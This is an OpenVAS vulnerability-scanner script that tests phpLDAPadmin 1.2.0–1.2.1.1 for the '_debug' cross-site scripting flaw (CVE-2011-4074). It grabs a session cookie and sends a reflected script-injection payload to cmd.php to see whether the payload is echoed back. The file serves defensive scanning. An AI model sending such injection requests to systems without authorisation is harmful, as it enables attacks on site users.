###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpldapadmin_debug_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# phpLDAPadmin '_debug' Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "phpLDAPadmin versions 1.2.0 through 1.2.1.1";
tag_insight = "The flaw is due to improper validation of user-supplied input appended
  to the URL in cmd.php (when 'cmd' is set to '_debug'), which allows attackers
  to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.";
tag_solution = "Apply patch from below link,
  http://phpldapadmin.git.sourceforge.net/git/gitweb.cgi?p=phpldapadmin/phpldapadmin;a=commit;h=64668e882b8866fae0fa1b25375d1a2f3b4672e2";
tag_summary = "This host is running phpLDAPadmin and is prone to cross site
  scripting vulnerability.";

if(description)
{
  script_id(802265);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-11-03 12:22:48 +0100 (Thu, 03 Nov 2011)");
  script_cve_id("CVE-2011-4074");
  script_bugtraq_id(50331);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("phpLDAPadmin '_debug' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/46551");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/70918");
  script_xref(name : "URL" , value : "http://openwall.com/lists/oss-security/2011/10/24/9");
  script_xref(name : "URL" , value : "https://bugzilla.redhat.com/show_bug.cgi?id=748538");

  script_description(desc);
  script_summary("Check if phpLDAPadmin is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("phpldapadmin_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("phpldapadmin/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get phpLDAPadmin Directory
if(! dir = get_dir_from_kb(port:port,app:"phpldapadmin")){
  exit(0);
}

## Send and Receive the response
req = http_get(item:string(dir, "/index.php"),  port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Get Session ID
cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
if(isnull(cookie[1])) {
  exit(0);
}
cookie = cookie[1];

## Construct attack request
url = "/cmd.php?cmd=_debug&<script>alert('OV-XSS-Attack-Test')</script>";
req = http_get(item:dir + url, port:port);
req = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');

## Send request and receive the response
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if("<script>alert('OV-XSS-Attack-Test')</script>" >< res){
  security_warning(port);
}
